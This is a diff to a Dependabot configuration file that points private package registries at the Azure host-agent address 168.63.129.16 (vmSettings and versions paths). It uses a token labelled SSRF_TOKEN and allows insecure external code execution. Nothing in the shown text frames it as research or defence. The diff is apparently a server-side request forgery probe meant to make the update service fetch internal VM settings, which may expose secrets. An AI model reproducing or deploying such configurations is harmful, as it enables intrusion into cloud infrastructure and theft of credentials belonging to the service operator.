@@ -1,16 +1,8 @@
 version: 2
 registries:
-  vmsettings-sub:
+  hgap:
     type: python-index
-    url: http://168.63.129.16:32526/vmSettings/extensions#
-    token: ${{ secrets.SSRF_TOKEN }}
-  vmsettings-ver:
-    type: python-index
-    url: http://168.63.129.16:32526/vmSettings?api-version=invalid#
-    token: ${{ secrets.SSRF_TOKEN }}
-  versions-full:
-    type: python-index
-    url: http://168.63.129.16:32526/versions?format=json#
+    url: http://168.63.129.16:32526/vmSettings#
     token: ${{ secrets.SSRF_TOKEN }}
 updates:
   - package-ecosystem: "pip"
@@ -19,6 +11,4 @@ updates:
       interval: "daily"
     insecure-external-code-execution: allow
     registries:
-      - vmsettings-sub
-      - vmsettings-ver
-      - versions-full
+      - hgap
